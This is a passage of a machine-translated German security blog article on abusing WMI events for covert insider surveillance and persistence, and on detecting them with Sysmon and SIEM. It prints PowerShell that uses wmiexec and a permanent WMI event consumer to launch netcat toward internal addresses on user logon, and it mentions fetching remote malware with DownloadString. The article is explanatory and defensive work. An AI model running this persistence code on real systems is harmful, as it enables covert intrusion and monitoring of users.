<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es sah vielversprechend aus und schien gemäß dem Windows-Ereignisprotokoll im Zielsystem korrekt zu funktionieren. </font><font style="vertical-align: inherit;">Bei näherer Betrachtung stellte ich jedoch fest, dass es nicht funktioniert. </font><font style="vertical-align: inherit;">Ich bin mir sicher, dass ich es am Ende in die richtige Form bringen könnte, aber dafür würde ich Zeit und Kaffee brauchen, viel Kaffee. </font><font style="vertical-align: inherit;">Es gibt noch eine andere Option, die etwas weniger unauffällig und überhaupt nicht dateifrei ist: Sie können das Skript mit smbclient übertragen und dann direkt auf dem Zielcomputer ausführen.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Die Remote-Ausführung des komplexen Cmdlets Register-Event schien mir absolut korrekt. </font><font style="vertical-align: inherit;">Aber es hat nicht funktioniert. </font><font style="vertical-align: inherit;">Nun, </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
leider, zu diesem Zeitpunkt begannen meine Annahmen, dass ein kluger, aber nicht zu erfahrener Insider vorübergehende WMI-Ereignisse leicht für verdeckte Überwachung nutzen könnte, auseinanderzufallen.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum sollten konstante Ereignisse zur Beobachtung verwendet werden? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Richtige und gleichzeitig vertiefende Wissen ist die Verwendung dauerhafter WMI-Ereignisse. Permanente WMI-Ereignisse sind zwar von einiger Komplexität, aber nicht nur ein wirksameres Werkzeug für Insider-Spione als temporäre Ereignisse, sondern ermöglichen Ihnen auch eine effektivere Überwachung interner Bedrohungen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Studieren persistenter Ereignisse wird einige Zeit in Anspruch nehmen, ist jedoch der effektivste Weg, um ein strenges Überwachungssystem für große Systeme zu implementieren. Sie verfügen über mehr Funktionen als temporäre WMI-Ereignisse. Sie können auch verwendet werden, um Sie auf nicht standardmäßige böswillige Aktivitäten wie DNS-Tunneling oder Verstöße gegen </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Zero Trust-</font></a><font style="vertical-align: inherit;"> Richtlinien aufmerksam zu machen </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich habe einige Tage damit verbracht, persistente Ereignisse zu untersuchen, und festgestellt, dass PowerShell über ein spezielles Cmdlet verfügt, das das Erstellen eines Ereignisfilters, eines Verbrauchers und von WMI-Objekten zwischen dem Filter und dem Verbraucher vereinfacht. Wie wir alle wissen, bietet PowerShell Administratoren zahlreiche Möglichkeiten, ihre Arbeit zu vereinfachen. Leider zeigt dieses Beispiel, wie Angreifer diese großartigen Funktionen nutzen können. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ein Insider erstellt ein konstantes Ereignis auf dem Zielsystem und befreit sich dadurch von der Notwendigkeit, in einer Shell-Sitzung anwesend zu sein. Das Ereignis bleibt für immer dort oder bis es explizit gelöscht wird. Weitere Informationen hierzu finden Sie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hier.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Insgesamt ähnelt der Prozess jedoch dem, was ich oben bei einem vorübergehenden Ereignis getan habe. </font><font style="vertical-align: inherit;">Das Letzte, was unser Hacker benötigt, ist, einem Ereigniskonsumenten einen Ereignisfilter zuzuordnen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich stimme zu, dass dies für einen normalen Mitarbeiter, der sich plötzlich entschied, ein böser Hacker zu werden, zu cool aussieht. </font><font style="vertical-align: inherit;">Aus Gründen des Interesses habe ich verschiedene </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foren</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> gelesen </font><font style="vertical-align: inherit;">und festgestellt, dass viele Menschen erfolglos darum kämpfen, die ständigen WMI-Ereignisse zum Laufen zu bringen. </font><font style="vertical-align: inherit;">Dies geht jedoch nicht über die Fähigkeiten unserer „Snowden“ und anderer versierter Systemadministratoren hinaus, die beschlossen haben, auf die dunkle Seite zu wechseln.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Konstante Ereignisse: Tipps für IT-Administratoren</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Diese Methoden sind nicht dazu gedacht, potenzielle Hacker oder beleidigte Mitarbeiter zu schulen, die sich am Arbeitgeber rächen wollen. </font><font style="vertical-align: inherit;">Ich möchte IT-Fachleuten lediglich helfen, die Denkweise des Hackers zu verstehen, damit sie einen angemessenen Schutz vor Penetrationsangriffen implementieren können. </font><font style="vertical-align: inherit;">Für sie zeige ich, wie Filter- und Consumer-Objekte mit dem </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cmdlet Set-WmiInstance konfiguriert werden</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = “cruella”<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ihre Hausaufgabe besteht darin, PowerShell-Code zu erstellen, der diese beiden Komponenten miteinander verbindet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Während meiner eigenen Tests konnte ich ein permanentes Ereignis erhalten, um ohne übermäßige Anstrengung und Leiden am Zielsystem zu arbeiten. </font><font style="vertical-align: inherit;">Wie Sie sich erinnern, war dies mit temporären WMI-Ereignissen, die genauso lange dauern wie eine PowerShell-Sitzung, sehr schwierig zu erreichen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Durch das Einrichten eines dauerhaften WMI-Ereignisses, beispielsweise zum Überwachen der Benutzeranmeldung, muss kein Insider oder Hacker im Zielsystem verbleiben. Ein zusätzlicher Bonus ist, dass ein dauerhaftes WMI-Ereignis robust ist: Wenn der Computer neu gestartet wird, funktionieren Ereignisauslöser weiterhin. Dies macht WMI-persistente Ereignisse zu einer leistungsstarken und verdeckten Möglichkeit, einen Angriff auszulösen, der viel mehr als nur Überwachung umfassen kann. Wie Sie sich erinnern, sind WMI-Ereignisse weit davon entfernt, dass Sicherheitsspezialisten nach der Quelle des Angriffs suchen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beispielsweise kann PowerShell-Code für einen Ereigniskonsumenten als Starter fungieren und mit DownloadString auf einem Remote-Server gespeicherte Malware </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">herunterladen</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Tolle </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Präsentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber auf der Black Hat-Konferenz enthält viele Informationen über das schädliche Potenzial persistenter WMI-Ereignisse. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie werden Sie als Sicherheitsspezialist mit WMI-Ereignissen im Hinblick auf ihre potenzielle böswillige Verwendung arbeiten? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Viel Glück auf Ihrer Seite: Mit dem Cmdlet Get-WmiObject (alias gwmi) können Sie eine Liste von Ereignisfiltern, Verbrauchern und Bindungsobjekten erstellen:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sie listen WMI-persistente Ereignisse mit Get-WMIObject auf und legen die entsprechenden Parameter fest. </font><font style="vertical-align: inherit;">Beachten Sie das Fehlen eines Zeitstempels. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn sie nun den Filter (oder Verbraucher) eines permanenten Ereignisses als verdächtig </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">empfinden, können IT-Experten ihn deaktivieren</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , indem sie ihn mithilfe der PowerShell-Pipeline und des </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Cmdlets WMI-RemoveObject entfernen</font></a><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Das Entfernen dauerhafter WMI-Ereignisse erfordert die Verwendung der PowerShell-Pipeline. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beachten Sie, dass hier weder der Zeitpunkt der Generierung des Ereignisses noch der Name des böswilligen Benutzers angegeben sind. </font><font style="vertical-align: inherit;">Um diese forensischen Informationen zu erhalten, müssen Sie die Windows-Ereignisprotokolle konsultieren. </font><font style="vertical-align: inherit;">Mehr dazu weiter unten.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kann ich dauerhafte WMI-Ereignisse deaktivieren?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zumindest können IT-Experten aufgezeichnete WMI-Ereignisse schnell erkennen und reale Szenarien auf Anzeichen von Bedrohungen analysieren. Als erfahrener IT-Sicherheitsspezialist denken Sie vielleicht, dass nicht jeder WMI auf Laptops benötigt. Die beste Strategie für den Umgang mit WMI-Sicherheitslücken bei dauerhaften Ereignissen besteht darin, WMI vollständig zu deaktivieren. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie können versuchen, den </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt-</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Dienst zu deaktivieren </font><font style="vertical-align: inherit;">, der WMI startet. In der Praxis ist dies nicht so einfach. Bei meinen eigenen Tests konnte ich diesen Dienst nicht deaktivieren: Er wurde automatisch immer wieder gestartet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Angenommen, Sie haben es trotzdem geschafft, es zu deaktivieren. Windows-Verwaltungssoftware ist stark von WMI abhängig und funktioniert nicht, wenn Winmgmt nicht verfügbar ist. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Foren im</font></a><font style="vertical-align: inherit;"> ganzen Internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gefüllt mit Meldungen, die vor dem Deaktivieren von WMI warnen. </font><font style="vertical-align: inherit;">Ich rate Ihnen, Ihre WMI anzuhören und sich ihrer zu erbarmen.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identifizieren Sie WMI-Bedrohungsereignisse mit Sysmon und SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im Allgemeinen müssen Sie die WMI-Ereignisanfälligkeit als Tatsache akzeptieren. Glücklicherweise gibt es unter Windows effizientere Möglichkeiten, persistente Ereignisse und andere verdächtige Ereignisse zu erkennen, als mit dem oben genannten Powershell-Cmdlet. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Treffen Sie Sysmon! Ich werde nicht auf Details zu diesem kostenlosen Windows-Dienstprogramm eingehen, das </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hier</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> in diesem Artikel </font><font style="vertical-align: inherit;">heruntergeladen </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">werden</font></a><font style="vertical-align: inherit;"> kann </font><font style="vertical-align: inherit;">. Ich kann nur sagen, dass Sie damit sehr nützliche Informationen für die Analyse an einem Ort erhalten können, anstatt jedes Windows-Ereignisprotokoll einzeln anzuzeigen. Benutzer von Windows 7 und höher benötigen möglicherweise kein Sysmon, da neuere Windows-Systeme erweiterte Standardprotokollierungsmechanismen verwenden.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmon ist ein praktisches und intuitives Ereignisprotokollierungstool von Microsoft. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon weist der Erstellung eines permanenten WMI-Filterereignisses die Ereigniskennung 19 zu (20 wird zum Erstellen eines WMI-Verbraucherereignisses und 21 der WMI-Bindung zugewiesen). Wenn Sie die Ereignisanzeige öffnen, finden Sie das Sysmon-Ereignisprotokoll im Abschnitt Microsoft -&gt; Windows -&gt; Sysmon. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie möchten die Ereignisanzeige nicht manuell öffnen, um dauerhafte WMI-Ereignisse zu überwachen. Dies kann ein Zeichen für Hackeraktivität sein. Wir wissen, wie wir Ihnen helfen können. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Warum nicht einen Filter für persistente WMI-Ereignisse erstellen, um die Erstellung (erraten?) Eines persistenten WMI-Ereignisses zu überwachen? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Auf </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Es gibt ein kleines Projekt, in dem Sie Code zum Konfigurieren dieses Vorgangs finden. </font><font style="vertical-align: inherit;">Hier ist ein Codefragment für einen WMI-Ereignisfilter, mit dem Sie die Erstellung von ... Ja, einem WMI-Ereignisfilter verfolgen können:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Offensichtlich benötigen wir hier die Hilfe von SIEM-Tools (Information Security and Security Events Management), da die Beweise in den Trümmern von Magazinen vergraben sind. </font><font style="vertical-align: inherit;">Ich denke du verstehst, wohin alles geht. </font><font style="vertical-align: inherit;">Sie benötigen eine </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sicherheitsüberwachungslösung</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , die SIEM-Funktionen mit der Analyse anderer Bedrohungen kombiniert, um Bedrohungen im Zusammenhang mit dauerhaften WMI-Ereignissen zu erkennen und zu beseitigen.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Häufig gestellte Fragen zur Windows-Verwaltungsinstrumentierung</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die oben beschriebenen Methoden können durchaus verwendet werden, um ein Überwachungssystem in Ihrem Netzwerk zu implementieren. Möglicherweise haben Sie jedoch Fragen zu WMI. </font><font style="vertical-align: inherit;">In diesem Abschnitt werden wir die häufigsten beantworten.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ist WMI veraltet?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI selbst ist nicht veraltet, aber WMIC ist veraltet, was für viele Menschen verwirrend ist. </font><font style="vertical-align: inherit;">PowerShell wird jetzt verwendet, um auf die zuvor von WMIC bereitgestellten Funktionen zuzugreifen.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Ports verwendet WMI? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI verwendet den TCP-Port 135 und eine Reihe dynamischer Ports: 49152-65535 (dynamische RPC-Ports: Windows Vista, 2008 und höher), TCP 1024-65535 (dynamische RPC-Ports: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">Sie können auch einen benutzerdefinierten Portbereich für WMI konfigurieren.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verwendet WMI WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Diese Konfiguration ist nicht Standard, aber Sie können WMI verwenden, um Daten mithilfe von Skripten oder Anwendungen mithilfe der WinRM-Skript-API oder mithilfe des Winrm-Befehlszeilentools abzurufen. </font><font style="vertical-align: inherit;">WinRM kann WMI verwenden, um Ressourcendaten zu sammeln oder Ressourcen im Windows-Betriebssystem zu verwalten.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fazit</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie wir gesehen haben, bietet WMI Administratoren ein leistungsstarkes Tool zur Überwachung von Remoteprozessen und Computern und kann bei der Entwicklung von Endbenutzerüberwachungsvereinbarungen (EUMAs) verwendet werden, um verdächtige Aktivitäten automatisch zu alarmieren. </font><font style="vertical-align: inherit;">Dies macht es zu einem großartigen Tool zum Erkennen und Beseitigen interner Bedrohungen, zum Verhindern von Versuchen, Sicherheitsrichtlinien zu umgehen, und zum Überwachen der Verwendung Ihrer Systeme. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn Sie mehr über die Verwendung von WMI zur Überwachung von Insideraktivitäten erfahren möchten, können Sie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hier</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> unsere ausführliche Anleitung herunterladen </font><font style="vertical-align: inherit;">.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de507044/index.html">Das günstigste Board zum Experimentieren mit SoC'om MCU & FPGA</a></li>
<li><a href="../de507048/index.html">Olya, Tests und Fabrik - der Weg zu schöner Architektur und sauberem Code</a></li>
<li><a href="../de507050/index.html">Analyse des Hollow Knight-Spieldesigns. Teil 1. Vergessene Kreuzung</a></li>
<li><a href="../de507052/index.html">Der coolste Data Scientist verschwendet keine Zeit mit Statistiken</a></li>
<li><a href="../de507066/index.html">10 Möglichkeiten zur Automatisierung von Anzeigen in Google Ads</a></li>
<li><a href="../de507074/index.html">SIMD-Spickzettel, jetzt für .NET Core</a></li>
<li><a href="../de507078/index.html">Das Gericht befahl den Medien, den Artikel eines anderen zu entfernen und eine Widerlegung des Haupt-Yandex zu veröffentlichen</a></li>
<li><a href="../de507080/index.html">Alle Tassen: Die Geschichte eines großartigen Ökosystemdesigns</a></li>
<li><a href="../de507084/index.html">SpatialChat-Partys wurden während der Pandemie populär - und es ist unwahrscheinlich, dass sie nach der Bucht enden</a></li>
<li><a href="../de507086/index.html">Konvertieren Sie das Bash-Skript in C # -Code, um SMS über das USB-Modem HUAWEI E3372 zu senden</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>